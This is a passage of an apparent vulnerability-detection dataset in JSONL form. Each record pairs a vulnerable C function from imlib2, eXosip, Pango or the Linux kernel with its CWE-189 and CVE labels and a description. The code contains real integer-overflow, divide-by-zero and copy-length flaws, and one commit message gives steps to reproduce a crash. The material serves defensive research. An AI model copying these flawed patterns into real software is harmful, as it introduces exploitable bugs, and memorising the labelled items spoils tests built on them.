idata;\n                  if (v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (iptr[0] << 16) | (iptr[1] << 8)\n                               | iptr[2];\n                            ptr2++;\n                            iptr += 3;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((iptr[0] * 255) / v) << 16) |\n                               (((iptr[1] * 255) / v) << 8) |\n                               ((iptr[2] * 255) / v);\n                            ptr2++;\n                            iptr += 3;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '4':            /* binary 1bit monochrome */\n             data = malloc((w + 7) / 8 * sizeof(DATA8));\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, (w + 7) / 8, 1, f))\n                     goto quit_error;\n\n                  ptr = data;\n                  for (x = 0; x < w; x += 8)\n                    {\n                       j = (w - x >= 8) ? 8 : w - x;\n                       for (i = 0; i < j; i++)\n                         {\n                            if (ptr[0] & (0x80 >> i))\n                               *ptr2 = 0xff000000;\n                            else\n                               *ptr2 = 0xffffffff;\n                            ptr2++;\n                         }\n                       ptr++;\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '5':            /* binary 8bit grayscale GGGGGGGG */\n             data = malloc(1 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 1, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (ptr[0] << 16) | (ptr[0] << 8) |\n                               ptr[0];\n                            ptr2++;\n                            ptr++;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[0] * 255) / v) << 8) |\n                               ((ptr[0] * 255) / v);\n                            ptr2++;\n                            ptr++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '6':            /* 24bit binary RGBRGBRGB */\n             data = malloc(3 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 3, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (ptr[0] << 16) | (ptr[1] << 8) |\n                               ptr[2];\n                            ptr2++;\n                            ptr += 3;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[1] * 255) / v) << 8) |\n                               ((ptr[2] * 255) / v);\n                            ptr2++;\n                            ptr += 3;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '7':            /* XV's 8bit 332 format */\n             data = malloc(1 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 1, 1, f))\n                     break;\n\n                  ptr = data;\n                  for (x = 0; x < w; x++)\n                    {\n                       int                 r, g, b;\n\n                       r = (*ptr >> 5) & 0x7;\n                       g = (*ptr >> 2) & 0x7;\n                       b = (*ptr) & 0x3;\n                       *ptr2 =\n                          0xff000000 |\n                          (((r << 21) | (r << 18) | (r << 15)) & 0xff0000) |\n                          (((g << 13) | (g << 10) | (g << 7)) & 0xff00) |\n                          ((b << 6) | (b << 4) | (b << 2) | (b << 0));\n                       ptr2++;\n                       ptr++;\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '8':            /* 24bit binary RGBARGBARGBA */\n             data = malloc(4 * sizeof(DATA8) * w);\n             if (!data)\n                goto quit_error;\n\n             ptr2 = im->data;\n             for (y = 0; y < h; y++)\n               {\n                  if (!fread(data, w * 4, 1, f))\n                      break;\n \n                   ptr = data;\n                  if (v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               (ptr[3] << 24) | (ptr[0] << 16) |\n                               (ptr[1] << 8) | ptr[2];\n                            ptr2++;\n                            ptr += 4;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               (((ptr[3] * 255) / v) << 24) |\n                               (((ptr[0] * 255) / v) << 16) |\n                               (((ptr[1] * 255) / v) << 8) |\n                               ((ptr[2] * 255) / v);\n                            ptr2++;\n                            ptr += 4;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          default:\n           quit_error:\n             rc = 0;\n             break;\n           quit_progress:\n             rc = 2;\n             break;\n          }\n        if (idata)\n           free(idata);\n        if (data)\n           free(data);\n     }\n quit:\n   fclose(f);\n   return rc;\n}\n", "func_hash": 32746376758885450059100501942516345295, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9763", "cve_desc": "imlib2 before 1.4.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted PNM file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9763"}
{"idx": 456, "project": "enlightment", "commit_id": "c94d83ccab15d5ef02f88d42dce38ed3f0892882", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=c94d83ccab15d5ef02f88d42dce38ed3f0892882", "commit_message": "None", "target": 1, "func": "__imlib_Ellipse_DrawToData(int xc, int yc, int a, int b, DATA32 color,\n                           DATA32 * dst, int dstw, int clx, int cly, int clw,\n                           int clh, ImlibOp op, char dst_alpha, char blend)\n{\n   ImlibPointDrawFunction pfunc;\n   int                 xx, yy, x, y, prev_x, prev_y, ty, by, lx, rx;\n   DATA32              a2, b2, *tp, *bp;\n   DATA64              dx, dy;\n\n   if (A_VAL(&color) == 0xff)\n      blend = 0;\n   pfunc = __imlib_GetPointDrawFunction(op, dst_alpha, blend);\n   if (!pfunc)\n      return;\n\n   xc -= clx;\n   yc -= cly;\n   dst += (dstw * cly) + clx;\n\n   a2 = a * a;\n   b2 = b * b;\n\n   yy = b << 16;\n   prev_y = b;\n\n   dx = a2 * b;\n   dy = 0;\n\n   ty = yc - b - 1;\n   by = yc + b;\n   lx = xc - 1;\n   rx = xc;\n\n   tp = dst + (dstw * ty) + lx;\n   bp = dst + (dstw * by) + lx;\n\n   while (dy < dx)\n     {\n        int                 len;\n\n        y = yy >> 16;\n        y += ((yy - (y << 16)) >> 15);\n\n        if (prev_y != y)\n          {\n             prev_y = y;\n             dx -= a2;\n             ty++;\n             by--;\n             tp += dstw;\n             bp -= dstw;\n          }\n\n        len = rx - lx;\n\n        if (IN_RANGE(lx, ty, clw, clh))\n           pfunc(color, tp);\n        if (IN_RANGE(rx, ty, clw, clh))\n           pfunc(color, tp + len);\n        if (IN_RANGE(lx, by, clw, clh))\n           pfunc(color, bp);\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n         dy += b2;\n         yy -= ((dy << 16) / dx);\n         lx--;\n\n        if ((lx < 0) && (rx > clw))\n           return;\n        if ((ty > clh) || (by < 0))\n           return;\n     }\n\n   xx = yy;\n   prev_x = xx >> 16;\n\n   dx = dy;\n\n   ty++;\n   by--;\n\n   tp += dstw;\n   bp -= dstw;\n\n   while (ty < yc)\n     {\n        int                 len;\n\n        x = xx >> 16;\n        x += ((xx - (x << 16)) >> 15);\n\n        if (prev_x != x)\n          {\n             prev_x = x;\n             dy += b2;\n             lx--;\n             rx++;\n             tp--;\n             bp--;\n          }\n\n        len = rx - lx;\n\n        if (IN_RANGE(lx, ty, clw, clh))\n           pfunc(color, tp);\n        if (IN_RANGE(rx, ty, clw, clh))\n           pfunc(color, tp + len);\n        if (IN_RANGE(lx, by, clw, clh))\n           pfunc(color, bp);\n        if (IN_RANGE(rx, by, clw, clh))\n           pfunc(color, bp + len);\n\n         if (IN_RANGE(rx, by, clw, clh))\n            pfunc(color, bp + len);\n \n         dx -= a2;\n         xx += ((dx << 16) / dy);\n         ty++;\n        if ((ty > clh) || (by < 0))\n           return;\n     }\n}\n", "func_hash": 155577364624288382699010849819044776563, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-5326", "cve_desc": "imlib2 before 1.4.9 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) by drawing a 2x1 ellipse.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-5326"}
{"idx": 515, "project": "savannah", "commit_id": "2549e421c14aff886629b8482c14af800f411070", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "http://git.savannah.nongnu.org/cgit/exosip.git/commit/?id=2549e421c14aff886629b8482c14af800f411070", "commit_message": "None", "target": 1, "func": "eXosip_init (struct eXosip_t *excontext)\n{\n  osip_t *osip;\n  int i;\n\n  memset (excontext, 0, sizeof (eXosip_t));\n\n  excontext->dscp = 0x1A;\n\n  snprintf (excontext->ipv4_for_gateway, 256, \"%s\", \"217.12.3.11\");\n  snprintf (excontext->ipv6_for_gateway, 256, \"%s\", \"2001:638:500:101:2e0:81ff:fe24:37c6\");\n\n#ifdef WIN32\n  /* Initializing windows socket library */\n  {\n    WORD wVersionRequested;\n    WSADATA wsaData;\n\n    wVersionRequested = MAKEWORD (1, 1);\n    i = WSAStartup (wVersionRequested, &wsaData);\n    if (i != 0) {\n      OSIP_TRACE (osip_trace (__FILE__, __LINE__, OSIP_WARNING, NULL, \"eXosip: Unable to initialize WINSOCK, reason: %d\\n\", i));\n      /* return -1; It might be already initilized?? */\n    }\n  }\n#endif\n\n  excontext->user_agent = osip_strdup (\"eXosip/\" EXOSIP_VERSION);\n  if (excontext->user_agent == NULL)\n    return OSIP_NOMEM;\n\n  excontext->j_calls = NULL;\n  excontext->j_stop_ua = 0;\n#ifndef OSIP_MONOTHREAD\n  excontext->j_thread = NULL;\n#endif\n  i = osip_list_init (&excontext->j_transactions);\n  excontext->j_reg = NULL;\n\n#ifndef OSIP_MONOTHREAD\n#if !defined (_WIN32_WCE)\n  excontext->j_cond = (struct osip_cond *) osip_cond_init ();\n  if (excontext->j_cond == NULL) {\n    osip_free (excontext->user_agent);\n    excontext->user_agent = NULL;\n    return OSIP_NOMEM;\n  }\n#endif\n\n  excontext->j_mutexlock = (struct osip_mutex *) osip_mutex_init ();\n  if (excontext->j_mutexlock == NULL) {\n    osip_free (excontext->user_agent);\n    excontext->user_agent = NULL;\n#if !defined (_WIN32_WCE)\n    osip_cond_destroy ((struct osip_cond *) excontext->j_cond);\n    excontext->j_cond = NULL;\n#endif\n    return OSIP_NOMEM;\n  }\n#endif\n\n  i = osip_init (&osip);\n  if (i != 0) {\n    OSIP_TRACE (osip_trace (__FILE__, __LINE__, OSIP_ERROR, NULL, \"eXosip: Cannot initialize osip!\\n\"));\n    return i;\n  }\n\n  osip_set_application_context (osip, &excontext);\n\n  _eXosip_set_callbacks (osip);\n\n  excontext->j_osip = osip;\n\n#ifndef OSIP_MONOTHREAD\n  /* open a TCP socket to wake up the application when needed. */\n  excontext->j_socketctl = jpipe ();\n  if (excontext->j_socketctl == NULL)\n    return OSIP_UNDEFINED_ERROR;\n\n  excontext->j_socketctl_event = jpipe ();\n  if (excontext->j_socketctl_event == NULL)\n    return OSIP_UNDEFINED_ERROR;\n#endif\n\n  /* To be changed in osip! */\n  excontext->j_events = (osip_fifo_t *) osip_malloc (sizeof (osip_fifo_t));\n  if (excontext->j_events == NULL)\n    return OSIP_NOMEM;\n  osip_fifo_init (excontext->j_events);\n\n  excontext->use_rport = 1;\n  excontext->dns_capabilities = 2;\n  excontext->enable_dns_cache = 1;\n  excontext->ka_interval = 17000;\n  snprintf(excontext->ka_crlf, sizeof(excontext->ka_crlf), \"\\r\\n\\r\\n\");\n  excontext->ka_options = 0;\n   excontext->autoanswer_bye = 1;\n   excontext->auto_masquerade_contact = 1;\n   excontext->masquerade_via=0;\n \n   return OSIP_SUCCESS;\n }\n", "func_hash": 238204468281732099704255338098998330461, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-10375", "cve_desc": "handle_messages in eXtl_tls.c in eXosip before 5.0.0 mishandles a negative value in a content-length header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-10375"}
{"idx": 564, "project": "pango", "commit_id": "4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e", "project_url": "http://github.com/bratsche/pango", "commit_url": "http://github.com/bratsche/pango/commit/4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e", "commit_message": "[glyphstring] Handle overflow with very long glyphstrings", "target": 1, "func": "pango_glyph_string_set_size (PangoGlyphString *string, gint new_len)\n{\n  g_return_if_fail (new_len >= 0);\n\n   while (new_len > string->space)\n     {\n       if (string->space == 0)\n\tstring->space = 1;\n       else\n\tstring->space *= 2;\n      if (string->space < 0)\n \t{\n\t  g_warning (\"glyph string length overflows maximum integer size, truncated\");\n\t  new_len = string->space = G_MAXINT - 8;\n \t}\n     }\n \n  string->glyphs = g_realloc (string->glyphs, string->space * sizeof (PangoGlyphInfo));\n  string->log_clusters = g_realloc (string->log_clusters, string->space * sizeof (gint));\n  string->num_glyphs = new_len;\n}\n", "func_hash": 263605045719264644933052685862095185543, "file_name": "glyphstring.c", "file_hash": 149047394354023506604412689938745039694, "cwe": ["CWE-189"], "cve": "CVE-2009-1194", "cve_desc": "Integer overflow in the pango_glyph_string_set_size function in pango/glyphstring.c in Pango before 1.24 allows context-dependent attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a long glyph string that triggers a heap-based buffer overflow, as demonstrated by a long document.location value in Firefox.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-1194"}
{"idx": 573, "project": "linux", "commit_id": "8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664", "commit_message": "net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm\ncan cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:\n do_div(t, ca->cnt_rtt);\nwhere ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:\n 1. Register tcp_illinois:\n     # sysctl -w net.ipv4.tcp_congestion_control=illinois\n 2. Monitor internal TCP information via command \"ss -i\"\n     # watch -d ss -i\n 3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait\nfor a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also\nperforms the same divide, but is guarded with a (ca->cnt_rtt > 0) at its\ncalling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() / get_info() is called without\nsocket lock.  Thus, eliminate any race condition on ca->cnt_rtt\nby using a local stack variable.  Simply reuse info.tcpv_rttcnt,\nas its already set to ca->cnt_rtt.\nFunction avg_delay() is not affected by this race condition, as\nits called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Jesper Dangaard Brouer <brouer@redhat.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Stephen Hemminger <shemminger@vyatta.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static void tcp_illinois_info(struct sock *sk, u32 ext,\n\t\t\t      struct sk_buff *skb)\n{\n\tconst struct illinois *ca = inet_csk_ca(sk);\n\n\tif (ext & (1 << (INET_DIAG_VEGASINFO - 1))) {\n\t\tstruct tcpvegas_info info = {\n\t\t\t.tcpv_enabled = 1,\n \t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n \t\t\t.tcpv_minrtt = ca->base_rtt,\n \t\t};\n\t\tu64 t = ca->sum_rtt;\n \n\t\tdo_div(t, ca->cnt_rtt);\n\t\tinfo.tcpv_rtt = t;\n \n \t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n \t}\n }\n", "func_hash": 162920631819149101156572064040648031330, "file_name": "tcp_illinois.c", "file_hash": 159370893635524196096059297247530661948, "cwe": ["CWE-189"], "cve": "CVE-2012-4565", "cve_desc": "The tcp_illinois_info function in net/ipv4/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-4565"}
{"idx": 633, "project": "linux", "commit_id": "20e0fa98b751facf9a1101edaefbc19c82616a68", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68", "commit_message": "Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the\nuser passed buffer is passed the wrong size parameter when copying\ndata. res.acl_len contains both the bitmap and acl lenghts while\nacl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>", "target": 1, "func": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tres.acl_len);\n \t}\n \tret = acl_len;\n out_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}\n", "func_hash": 331883198314548248557810532406148163299, "file_name": "nfs4proc.c", "file_hash": 291748450445192791838620189778289896762, "cwe": ["CWE-189"], "cve": "CVE-2012-2375", "cve_desc": "The __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2375"}
{"idx": 652, "project": "linux", "commit_id": "d50f2ab6f050311dbf7b8f5501b25f0bf64a439b", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d50f2ab6f050311dbf7b8f5501b25f0bf64a439b", "commit_message": "ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c (\"ext4: avoid divide by\nzero when trying to mount a corrupted file system\") fixes CVE-2009-4307\nby performing a sanity check on s_log_groups_per_flex, since it can be\nset to a bogus value by an attacker.\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC.\nOn x86, 5 bits are used for the shifting amount.  That means, given a\nlarge s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36\nis essentially 1 << 4 = 16, rather than 0.  This will bypass the check,\nleaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift.\nA standard-confirming C compiler could rewrite the check in unexpected\nways.  Consider the following equivalent form, assuming groups_per_flex\nis unsigned for simplicity.\n\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\tif (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will\ncompletely optimize away the check groups_per_flex == 0, leaving the\npatched code as vulnerable as the original.  GCC keeps the check, but\nthere is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org", "target": 1, "func": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n \tstruct ext4_group_desc *gdp = NULL;\n \text4_group_t flex_group_count;\n \text4_group_t flex_group;\n\tint groups_per_flex = 0;\n \tsize_t size;\n \tint i;\n \n \tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\tif (groups_per_flex < 2) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n \n \t/* We allocate both existing and potentially added groups */\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = ext4_kvzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for %u flex groups\",\n\t\t\t flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_group_clusters(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_clusters);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}\n", "func_hash": 274161292744789021551891355559204521107, "file_name": "super.c", "file_hash": 154568347400018344364167160305285890777, "cwe": ["CWE-189"], "cve": "CVE-2012-2100", "cve_desc": "The ext4_fill_flex_info function in fs/ext4/super.c in the Linux kernel before 3.2.2, on the x86 platform and unspecified other platforms, allows user-assisted remote attackers to trigger inconsistent filesystem-groups data and possibly cause a denial of service via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).  NOTE: this vulnerability exists because of an incomplete fix for CVE-2009-4307.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2100"}
{"idx": 682, "project": "linux", "commit_id": "a5cd335165e31db9dbab636fd29895d41da55dd2", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a5cd335165e31db9dbab636fd29895d41da55dd2", "commit_message": "drm: integer overflow in drm_mode_dirtyfb_ioctl()\n\nThere is a potential integer overflow in drm_mode_dirtyfb_ioctl()\nif userspace passes in a large num_clips.  The call to kmalloc would\nallocate a small buffer, and the call to fb->funcs->dirty may result\nin a memory corruption.\n\nReported-by: Haogang Chen <haogangchen@gmail.com>\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nCc: stable@kernel.org\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 1, "func": "int drm_mode_dirtyfb_ioctl(struct drm_device *dev,\n\t\t\t   void *data, struct drm_file *file_priv)\n{\n\tstruct drm_clip_rect __user *clips_ptr;\n\tstruct drm_clip_rect *clips = NULL;\n\tstruct drm_mode_fb_dirty_cmd *r = data;\n\tstruct drm_mode_object *obj;\n\tstruct drm_framebuffer *fb;\n\tunsigned flags;\n\tint num_clips;\n\tint ret = 0;\n\n\tif (!drm_core_check_feature(dev, DRIVER_MODESET))\n\t\treturn -EINVAL;\n\n\tmutex_lock(&dev->mode_config.mutex);\n\tobj = drm_mode_object_find(dev, r->fb_id, DRM_MODE_OBJECT_FB);\n\tif (!obj) {\n\t\tDRM_ERROR(\"invalid framebuffer id\\n\");\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n\t}\n\tfb = obj_to_fb(obj);\n\n\tnum_clips = r->num_clips;\n\tclips_ptr = (struct drm_clip_rect *)(unsigned long)r->clips_ptr;\n\n\tif (!num_clips != !clips_ptr) {\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n\t}\n\n\tflags = DRM_MODE_FB_DIRTY_FLAGS & r->flags;\n\n\t/* If userspace annotates copy, clips must come in pairs */\n\tif (flags & DRM_MODE_FB_DIRTY_ANNOTATE_COPY && (num_clips % 2)) {\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n \t}\n \n \tif (num_clips && clips_ptr) {\n \t\tclips = kzalloc(num_clips * sizeof(*clips), GFP_KERNEL);\n \t\tif (!clips) {\n \t\t\tret = -ENOMEM;\n\t\t\tgoto out_err1;\n\t\t}\n\n\t\tret = copy_from_user(clips, clips_ptr,\n\t\t\t\t     num_clips * sizeof(*clips));\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out_err2;\n\t\t}\n\t}\n\n\tif (fb->funcs->dirty) {\n\t\tret = fb->funcs->dirty(fb, file_priv, flags, r->color,\n\t\t\t\t       clips, num_clips);\n\t} else {\n\t\tret = -ENOSYS;\n\t\tgoto out_err2;\n\t}\n\nout_err2:\n\tkfree(clips);\nout_err1:\n\tmutex_unlock(&dev->mode_config.mutex);\n\treturn ret;\n}\n", "func_hash": 108013488907801722177515826606033443457, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-0044", "cve_desc": "Integer overflow in the drm_mode_dirtyfb_ioctl function in drivers/gpu/drm/drm_crtc.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.1.5 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0044"}
{"idx": 753, "project": "linux", "commit_id": "56c6a8a4aadca809e04276eabe5552935c51387f", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/56c6a8a4aadca809e04276eabe5552935c51387f", "commit_message": "None", "target": 1, "func": " unsigned int oom_badness(struct task_struct *p, struct mem_cgroup *mem,\n \t\t      const nodemask_t *nodemask, unsigned long totalpages)\n {\n\tint points;\n \n \tif (oom_unkillable_task(p, mem, nodemask))\n \t\treturn 0;\n\n\tp = find_lock_task_mm(p);\n\tif (!p)\n\t\treturn 0;\n\n\t/*\n\t * Shortcut check for a thread sharing p->mm that is OOM_SCORE_ADJ_MIN\n\t * so the entire heuristic doesn't need to be executed for something\n\t * that cannot be killed.\n\t */\n\tif (atomic_read(&p->mm->oom_disable_count)) {\n\t\ttask_unlock(p);\n\t\treturn 0;\n\t}\n\n\t/*\n\t * The memory controller may have a limit of 0 bytes, so avoid a divide\n\t * by zero, if necessary.\n\t */\n\tif (!totalpages)\n\t\ttotalpages = 1;\n\n\t/*\n\t * The baseline for the badness score is the proportion of RAM that each\n\t * task's rss, 